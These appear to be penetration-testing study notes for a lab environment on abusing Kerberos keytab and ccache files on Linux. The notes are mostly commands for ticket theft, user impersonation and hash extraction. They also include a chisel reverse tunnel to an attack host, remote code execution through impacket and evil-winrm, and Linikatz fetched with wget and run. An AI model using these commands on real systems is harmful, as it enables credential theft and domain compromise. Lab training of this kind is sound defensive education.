# Kerberos on Linux
- Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) in the `/tmp` directory. By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`.
#### Linux Auth via Port Forward
```shell
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```
## Identifying Linux and Active Directory Integration
We can identify if the Linux machine is domain joined using [realm](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd)
#### realm - Check If Linux Machine is Domain Joined
```shell
realm list
```
#### PS - Check if Linux Machine is Domain Joined
```shell
ps -ef | grep -i "winbind\|sssd"
```
# Finding Kerberos Tickets in Linux
## Finding Keytab Files
#### Using Find to Search for Files with Keytab in the Name
```shell
find / -name *keytab* -ls 2>/dev/null
```
`Note: To use a keytab file, we must have read and write (rw) privileges on the file.`
#### Identifying Keytab Files in Cronjobs
```shell
crontab -l
```
In the above script, we notice the use of [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html), which means that Kerberos is in use. [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file). We can use `kinit` to import a `keytab` into our session and act as the user.
## Finding ccache Files
- A credential cache or [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts.
- The path to this file is placed in the `KRB5CCNAME` environment variable. This variable is used by tools that support Kerberos authentication to find the Kerberos data.
#### Reviewing Environment Variables for ccache Files
```shell
env | grep -i krb5
```
#### Searching for ccache Files in /tmp
```shell
ls -la /tmp
```
## Abusing KeyTab Files
#### Listing keytab File Information
```shell
klist -k -t 
```
#### Impersonating a User with a keytab
```shell
klist
```
```shell
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
```
```shell
klist
```
#### Connecting to SMB Share as Carlos
```shell
smbclient //dc01/carlos -k -c ls
```
**Note:** To keep the ticket from the current session, before importing the keytab, save a copy of the ccache file present in the enviroment variable `KRB5CCNAME`.
### Keytab Extract
#### Extracting Keytab Hashes with KeyTabExtract
```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
**Note:** A keytab file can contain different types of hashes and can be merged to contain multiple credentials even from different users.
#### Log in as Carlos
```shell
su - carlos@inlanefreight.htb
```
### Obtaining More Hashes
- Carlos has a cronjob that uses a keytab file named `svc_workstations.kt`. We can repeat the process, crack the password, and log in as `svc_workstations`.
## Abusing Keytab ccache
#### Privilege Escalation to Root
```shell
ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
```
```shell
sudo -l
```
```shell
sudo su
```
#### Looking for ccache Files
```shell
ls -la /tmp
```
#### Identifying Group Membership with the id Command
```shell
id julio@inlanefreight.htb
```
#### Importing the ccache File into our Current Session
```shell
klist
```
```shell
cp /tmp/krb5cc_647401106_I8I133 .
```
```shell
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
```
```shell
klist
```
```shell
smbclient //dc01/C$ -k -c ls -no-pass
```
# Using Linux Attack Tools with Kerberos
#### Host File Modified
```shell
cat /etc/hosts
```
#### Proxychains Configuration File
```shell
cat /etc/proxychains.conf
```
#### Download Chisel to our Attack Host
```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gzip -d chisel_1.7.7_linux_amd64.gz
mv chisel_* chisel && chmod +x ./chisel
sudo ./chisel server --reverse 
```
#### Connect to MS01 with xfreerdp
```shell
xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution
```
#### Execute chisel from MS01
```cmd
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```
#### Setting the KRB5CCNAME Environment Variable
```shell
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
### Impacket
#### Using Impacket with proxychains and Kerberos Authentication
```shell
proxychains impacket-wmiexec dc01 -k
```
### Evil-Winrm
#### Installing Kerberos Authentication Package
```shell
sudo apt-get install krb5-user -y
```
#### Kerberos Configuration File for INLANEFREIGHT.HTB
```shell
cat /etc/krb5.conf
```
#### Using Evil-WinRM with Kerberos
```shell
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
## Miscellaneous
#### Impacket Ticket Converter
```shell
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```
We can do the reverse operation by first selecting a `.kirbi file`. Let's use the `.kirbi` file in Windows.
#### Importing Converted Ticket into Windows Session with Rubeus
```cmd
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```
## Linikatz
- [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool created by Cisco's security team for exploiting credentials on Linux machines when there is an integration with Active Directory. 
- In other words, Linikatz brings a similar principle to `Mimikatz` to UNIX environments.
#### Linikatz Download and Execution
```shell
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```
